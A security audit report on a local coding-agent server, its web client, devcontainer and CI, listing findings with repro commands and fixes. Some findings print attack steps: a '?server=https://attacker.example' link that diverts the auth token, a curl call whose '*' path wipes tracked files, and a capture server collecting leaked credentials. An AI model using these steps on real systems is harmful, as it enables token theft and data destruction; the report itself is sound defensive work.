# Scrutiniser pass 1: server, protocol, client security, devcontainer, CI (2026-10-17)

Scope: `packages/server/**`, `packages/protocol`, the web client's security-relevant code (token handling, markdown/diff/tool-output
rendering, `dangerouslySetInnerHTML`, links, WS/URL construction), `devcontainer/**`, `scripts/**`, `Dockerfile`,
`docker-compose.yml`, `.github/workflows/**`. Visual/UI issues were out of scope.

Reviewed at commit `5dc5634` in an isolated worktree. That worktree was removed partway through the pass, so the last
probes ran against the main checkout (HEAD `207b5eb`). The server diff between the two commits only adds the context-usage
endpoint and `task.stop`. Every finding below still applies at `207b5eb`, and line numbers refer to `207b5eb`.

Baseline I ran myself: `npm install` (exit 0), `npm run build` (exit 0), `npm run typecheck` (exit 0), `npm test`: server 47
passed and 14 skipped (the real-SDK suite is gated behind `REAL_SDK`), web 43 passed. `npm audit --omit=dev`: 0 issues. The
full `npm audit` reports 6 issues, all in dev tooling (vitest/tinypool/vite/esbuild). Install scripts come only from esbuild
(postinstall) and node-pty (install/postinstall), and both are expected.

---

## BLOCKER

### B1. `?server=` lets any web page send the auth token (and later API keys, prompts and code) to an attacker host
- **Where:** `packages/web/src/lib/storage.ts:32-33` (`bootstrapToken` stores `?server=` in **localStorage** for good),
  used by `lib/api.ts` (REST with `Authorization: Bearer`), `lib/transport/ws.ts:124-126` (`/ws?token=`) and
  `panels/terminal/*` (`/ws/terminal?token=`).
- **Attack:** the attacker gets the victim to open `http://localhost:7777/?server=https://attacker.example` once, for
  example with a link or a top-level redirect from any site. A top-level GET carries no Origin header and the SPA is served
  without the token, so the page loads. From then on, every time the user opens the real tokenized URL printed by
  `workstation`, the SPA connects to the attacker instead of the server.
- **Repro (done):**
  ```
  WORKSTATION_MOCK=1 node packages/server/dist/cli.js --port 7791 --no-open        # prints token T
  node scratchpad/tools/evil.mjs 9911                                               # logs requests/upgrades
  node scratchpad/tools/serverparam.mjs http://127.0.0.1:7791 T http://127.0.0.1:9911  # Chromium 1194
  ```
  Output: `localStorage ws.serverUrl = http://127.0.0.1:9911`. The evil log then shows
  `[evil] UPGRADE /ws?token=<T> origin=http://127.0.0.1:7791` (4 times, from reconnects).
- **Expected:** the client talks only to its own origin unless the user explicitly confirms another server, and never
  sends the token anywhere else. **Actual:** one click poisons the client permanently and leaks the token. Saving the
  Settings dialog then PUTs the API key or auth token to the attacker, and the attacker can impersonate the server
  (fake permission prompts, file contents, terminal). When the server is reachable over the network (devcontainer
  default `--host 0.0.0.0`, Docker `-p 7777:7777` without the 127.0.0.1 prefix, LAN), the stolen token is full remote code
  execution.
- **Fix:** remove the `?server=` URL parameter. Make a non-same-origin server a Settings field (or the Electron adapter)
  that needs an explicit confirmation showing the host. Never send the token to an origin the user has not confirmed.
  Stop keeping the token and the server URL in different storage scopes, and clear `ws.serverUrl` whenever a `?token=`
  arrives. Regression test: a Playwright test that visits `/?server=http://127.0.0.1:<port>` and then `/?token=`, and
  asserts that no request goes to that port.

---

## MAJOR

### M1. `POST /api/git/revert` treats the path as a git pathspec (glob/magic). `"*"` deletes every tracked file, including uncommitted edits
- **Where:** `packages/server/src/git.ts:155` (`status -- rel`), `:170` (`git rm -f -q -- rel`) and `:174`
  (`checkout HEAD -- rel`). `SAFE_ARGS` (`:8`) has no `--literal-pathspecs`.
- **Repro (done):** use a repo with `keep.txt` (modified), `src/s.ts`, `src/l.ts` and `src/[slug].ts`, all tracked.
  ```
  curl -XPOST -H "Authorization: Bearer $T" -H 'content-type: application/json' \
    http://127.0.0.1:7791/api/git/revert -d '{"cwd":"<repo>","path":"*"}'
  → {"ok":true,"action":"deleted"}; git status: D keep.txt, D src/[slug].ts, D src/l.ts, D src/s.ts; working tree empty
  ```
  The modified content of `keep.txt` is gone for good. A variant that the UI can actually trigger is a stale or
  nonexistent path with glob characters, such as `src/[sl].ts`. That path matches `src/s.ts` and `src/l.ts` through the
  status pathspec, the HEAD check fails, and `git rm -f` deletes both, along with the uncommitted edits in `s.ts`. I
  reproduced this too. Paths with `[...]` are common (Next.js/SvelteKit routes). A stale Changes list is enough: for
  example, the agent deleted the untracked `[id].tsx` and a sibling `i.tsx` has edits.
- **Expected:** "discard changes of ONE file" (per the docstring and protocol) can only ever touch that file. **Actual:**
  it can delete many files and destroy uncommitted work.
- **Fix:** set `GIT_LITERAL_PATHSPECS=1` in `GIT_ENV`, or pass `--literal-pathspecs` in `SAFE_ARGS`, for every git call.
  Also require that the status entry's path equals `rel` exactly. Add tests for `*`, `:(top)`, `[x]`, and a pathspec
  that does not exist.

### M2. With a custom `anthropicBaseUrl` and no key/token, real Anthropic credentials and custom auth headers are still sent to the third-party endpoint ("the previous fix" is incomplete)
- **Where:** `packages/server/src/sdk.ts:53-68` (`buildCliEnv` strips 9 fixed env var names only);
  `session-manager.ts:274` (`settingSources: ['user', …]` and the user's own `~/.claude` stay in effect).
- **Repro (done, real SDK 0.3.302 CLI):** run a capture "provider" (`scratchpad/tools/capture.mjs 9912`, which logs
  credential-like headers and returns 401). Set config `{"anthropicBaseUrl":"http://127.0.0.1:9912"}` with no apiKey or
  authToken. Start the server with `HOME=<fake home holding ~/.claude/.credentials.json>`, set
  `ANTHROPIC_CUSTOM_HEADERS='X-Corp-Sso: corp-sso-SECRET'`, and blank every inherited `CLAUDE*`, `CCR_*` and
  `ANTHROPIC_*` variable. Start a session and send "say hi". The provider received:
  - `authorization: Bearer sk-ant-oat01-<REDACTED>`: a **real, live OAuth token** belonging to the host environment.
    It is not the fake one I planted. The CLI read it from a well-known credential file
    (`/home/claude/.claude/remote/.oauth_token` in this container), which no env stripping can catch. With the inherited
    env left in place, it also sent `x-claude-remote-container-id` and `x-claude-remote-session-id`.
  - `x-corp-sso: corp-sso-SECRET`: inherited `ANTHROPIC_CUSTOM_HEADERS` is forwarded unchanged.
  - Control run: when `apiKey` is also configured, only `x-api-key: <configured>` is sent, plus the leaked `x-corp-sso`.
    So the OAuth leak needs "base URL set, no key or token", which is the normal setup for a keyless gateway or for
    gateways that authenticate via `env`/headers.
  The same code path applies on a developer laptop to the user's Claude Code login (`~/.claude/.credentials.json` or the
  macOS keychain) and to an `apiKeyHelper` in `~/.claude/settings.json`. I could not isolate those here because the
  container's own credential file takes precedence (see "What I did not test"). This also conflicts with PRODUCT.md §5:
  without a configured key, the app silently runs on the user's claude.ai login.
- **Fix:** when a custom base URL is configured, (a) require an explicit `apiKey` or `authToken`, or pass a sentinel
  value so that the CLI never falls back to OAuth or keychain credentials (verify which variables take precedence in this
  CLI version); (b) also strip `ANTHROPIC_CUSTOM_HEADERS`, `CLAUDE_CODE_REMOTE*`, `CLAUDE_CODE_CONTAINER_ID`,
  `CLAUDE_CODE_ENTRYPOINT` and `CLAUDE_CONFIG_DIR`-derived credential sources unless they were set in AppConfig; (c)
  consider `settingSources` without `'user'`, or an isolated `CLAUDE_CONFIG_DIR`, for third-party providers. Add a
  real-SDK regression test that uses a capture server and asserts that no `authorization`/`x-api-key` header other than
  the configured one arrives. The existing real-SDK test only checks the positive path.

### M3. Concurrent resume of the same session creates two CLI processes. One is orphaned (never closed) and both write to the same transcript
- **Where:** `session-manager.ts:239` checks `this.sessions.has(msg.resume)`, then `:244` awaits `requireDir` (and the
  worktree step), then `:290` runs `sessions.set(id, s)` and overwrites the first entry.
- **Repro (done, mock):** `node scratchpad/tools/robust.mjs 7794 <T> <cwd>`. It starts a session and closes it, then
  sends `session.start {resume:id}` from two sockets at the same time. Both receive `session.started` for the same id.
  `/api/health` then reports `sessions: 0` after one close, while the other query object is still running and
  unreachable. In real mode that is a live `claude` process that `session.close`, `closeAll` and the orphan timer never
  reach. Real-world trigger: two tabs, or a reconnect plus a click, reopening the same historical session.
- **Fix:** register a "starting" placeholder (a promise) in the map before the first `await`, and have concurrent
  starts or attaches wait on it.

### M4. Devcontainer feature: insecure-by-default exposure and supply-chain shortcuts
- `install.sh:10` defaults `HOST=0.0.0.0`, and `install.sh:18` `DEFAULT_REPO=https://github.com/OWNER/...`. With
  `source=git` (the default) the build fails, because `OWNER` is a placeholder. The default install is broken, and anyone
  who registers that repo name controls what gets built as root.
- `install.sh:51` runs `curl … deb.nodesource.com/setup_N.x | bash -` as root. `install.sh:166` installs
  `@anthropic-ai/claude-code` with no version pin. `VERSION` defaults to the moving branch `main`. None of it is verified
  by checksum or signature.
- The autostart runs `workstation-url`, which prints the tokenized URL into the postStartCommand log (VS Code/Codespaces
  creation logs, which are often shared in bug reports). `server.log` also contains the token. It sits inside the 0700
  config dir, so the file itself is fine.
- **Fix:** default `host` to `127.0.0.1` where port forwarding works (VS Code forwards via localhost inside the
  container); document 0.0.0.0 as opt-in; pin the repo/ref (release tag) and the CLI version; use the official devcontainers
  node feature or a checksum-verified tarball instead of curl|bash; print the URL without the token by default (the token
  can be read with `workstation-url --show-token`).

---

## MINOR

1. **Any `http://localhost:<any port>` origin passes the Origin check** (`security.ts:17` and the `explicitHostnames`
   lookup in `isOriginAllowed`). Confirmed: `/ws` with `Origin: http://localhost:3000` is accepted. The token still gates
   access, but any local dev server (including one the agent itself starts for an untrusted project) is treated as
   same-site. Fix: require the origin's port to equal the server's port, or appear in `WORKSTATION_ALLOWED_ORIGINS`.
2. **The token travels in URL query strings** (`/ws?token=`, `/ws/terminal?token=`, and the printed `/?token=`), where it
   lands in proxy and access logs and in shell history. Consider `Sec-WebSocket-Protocol` for the WS token, plus a
   one-time code exchange for the bootstrap URL.
3. **The PTY env scrub (`terminal.ts:165` `SECRET_NAME`) is security theatre and breaks workflows.** It strips
   `GH_TOKEN`/`GITHUB_TOKEN`, so `gh` stops working in the integrated terminal, while the shell can still `cat
   ~/.config/workstation/config.json` (token and API keys). Either drop it and document that the terminal equals the
   user's shell, or limit it to `WORKSTATION_*` and the server's own token.
4. **`/api/git/diff` is not confined to the repo** (`git.ts:79-88`). For a path outside the repo, it falls back to
   `git diff --no-index /dev/null <abs>`, which returns any readable file. That is redundant with `/api/fs/read`, but it
   breaks the "repo-only" contract. Reject paths outside `root`.
5. **Commit runs `git add -A` on the whole repository with hooks disabled** (`git.ts:127`, `SAFE_ARGS core.hooksPath=/dev/null`).
   Untracked secrets such as a non-ignored `.env` get committed, and pre-commit secret scanners are bypassed silently.
   The UI should list exactly what will be staged (or stage only the files shown), and say that hooks are skipped.
6. **The config dir mode is not enforced on existing dirs** (`config.ts:27`: `mkdirSync` mode applies only on create).
   A pre-existing `~/.config/workstation` stays 0755 (observed). Add a `chmodSync(dir, 0o700)`.
7. **No request body limit on REST** (Hono node-server), and **WS `maxPayload` is 64 MB** (`app.ts:239`), with no cap on
   live sessions (each holds a 64 MB replay buffer) or on WS connections. Only a token holder can exploit this. Cap the
   body size at around 1 MB (images go over WS), and cap sessions and sockets.
8. **No security headers on the SPA** beyond nosniff and referrer policy: no CSP, no `frame-ancestors`/`X-Frame-Options`.
   The token sits in sessionStorage, so any XSS means RCE. A strict CSP (`script-src 'self'`) is cheap insurance, and
   `frame-ancestors 'none'` stops clickjacking of the approve buttons.
9. **`app.onError` returns raw `err.message` for 500s** (`app.ts`, onError), which leaks absolute paths and git stderr to
   the client. That is acceptable for a single user, but it is inconsistent with "secrets never echoed".
10. **`start()` init timeout timer is never cleared** (`session-manager.ts:298-300`). Each start leaves a 20 s timer
    running. The leak is minor, but it keeps test processes alive.
11. **Resuming a worktree session with `worktree:true` always fails**, because `git worktree add -b workstation/<id8>`
    fails when the branch already exists (`git.ts` `createWorktree`). The code path is visible; I did not reproduce it
    end-to-end.

## NIT

1. `WebCard` renders `href={url}` straight from model tool input (`components/ToolCards.tsx:157`). React 18 only warns
   on `javascript:` URLs. In Chromium 1194, `target=_blank rel=noopener` did not execute the URL in the app origin (I
   tested this), but other browsers and middle-click behaviour vary. Allow only `http(s):` URLs.
2. Markdown links depend on react-markdown's default `urlTransform`, which is fine. Shiki output is escaped, so the
   `dangerouslySetInnerHTML` uses in `DiffView.tsx:40`, `FileDiff.tsx:22`, `FilesPanel.tsx:104` and `Markdown.tsx:21` only
   ever receive Shiki HTML. Add a comment and a test that pins this, because a future "fallback to raw HTML" would turn
   them into XSS.
3. `release-feature.yml` grants `contents: write` and `pull-requests: write`, but `publish-features` with
   `generate-docs: false` needs only `packages: write`. `ci.yml` has no `permissions:` block, so it inherits the repo
   default, which may be write. Add `permissions: contents: read`, and pin actions by SHA.
4. `docker-compose.yml` passes `ANTHROPIC_BASE_URL: ""` when it is unset. That works today, but an empty base URL is easy
   to misread. The Docker log prints the tokenized URL (`docker logs`).
5. Dev-only audit findings: vitest 2 / vite 5 / esbuild (GHSA-67mh-4wv8-2f99 affects `vite` dev server). Run `npm run dev -w web`
   only on loopback (it is today), and upgrade when convenient.

---

## Verified as OK (so nobody re-checks them)
- REST without a token, or with a wrong or prefix token, returns 401. The comparison hashes both sides and uses
  `timingSafeEqual`.
- The `/ws` and `/ws/terminal` matrix: no token gives 401, a bad token gives 401, an evil Origin gives 403,
  `Origin: null` gives 403, a rebinding Host (`evil.example`, `localhost.evil.example`) gives 403, and a terminal id
  containing `../` is refused (1008).
- Malformed WS frames (non-JSON, `null`, arrays, numbers, a missing or odd `type`, `__proto__`, object-typed fields) all
  return error frames, and the server stays up.
- SIGKILL of the server with live real-SDK sessions leaves no orphaned `claude` CLI processes (3 children died with it).
- Static SPA serving rejects traversal (`path.join` plus a prefix check), and the token is not needed for static assets
  (by design).
- `config.json` is written 0600 through an atomic rename. GET `/api/config` masks `apiKey`/`authToken` and secret-named
  `env` values.

## The 10 most valuable missing tests
1. Client e2e: `?server=` cannot redirect the token to another origin (B1).
2. `gitRevert` with `*`, `:(top)`, `[x]`, and a stale glob path must touch nothing but the literal file (M1).
3. Real-SDK capture-server test: with a custom base URL and no key, no `authorization`/`x-api-key`/custom header reaches
   the provider; with a key, only that key does (M2).
4. Concurrent `session.start{resume}` from two sockets yields exactly one live query, and both clients attach (M3).
5. `gitRevert` refuses when the cwd is a subdirectory and the path is a symlink whose parent escapes the repo; untracked
   symlink-to-dir deletes only the link.
6. Commit stages exactly the files the UI listed and reports hook skipping (M5 behaviour).
7. Origin check rejects `http://localhost:<other port>` unless allowlisted (MINOR 1).
8. Worktree lifecycle: resume with `worktree:true`, delete with `?force=1` deletes only `workstation/<id>`, and a forged
   `worktrees.json` record outside `.claude/worktrees/` is refused.
9. Terminal: the 33rd terminal is refused, idle reaping kills the PTY, and closing the server leaves no shell processes
   (check with `pgrep`).
10. DoS caps: a 70 MB WS frame closes only that socket, an oversized REST body gets 413, and the replay buffer stays
    bounded across many sessions.

## Verdict: **NOT READY**
B1 is a one-click token exfiltration, and M2 sends real credentials to third parties. Both break principle 6 ("Safe by
default") outright. M1 can destroy uncommitted work. Fix B1, M1, M2 and M3 and add their regression tests, and I will
re-check. M4 must be fixed before the feature is published.

## What I did not test
- Laptop credential sources (`~/.claude/.credentials.json`, macOS keychain, `apiKeyHelper`) in isolation. In this
  container a well-known remote credential file wins, so I proved the class of leak but not those specific sources.
- Bedrock/Vertex env (`CLAUDE_CODE_USE_BEDROCK`, AWS creds) together with a custom base URL.
- A real devcontainer build (the feature install script), Codespaces Host/Origin behaviour, and Docker image runtime.
- Windows/macOS (`openBrowser`, the python PTY fallback, path semantics).
- Races between permission responses and interrupts under the real CLI. I read the code (the respond-after-cancel path
  throws a clean "no pending" error) but did not stress it.
- Huge uploads and memory-exhaustion DoS (MINOR 7 comes from reading the code, not from measurement).
- XSS through every tool card renderer. I covered markdown, Shiki, diff and the WebFetch link, not every panel.
- `rewind`, MCP toggle and `task.stop` against the real CLI. The context-usage endpoint added after `5dc5634` was not
  reviewed in depth.
- The full Playwright e2e suite (60 tests). I did not re-run it; only the unit and integration suites were run.
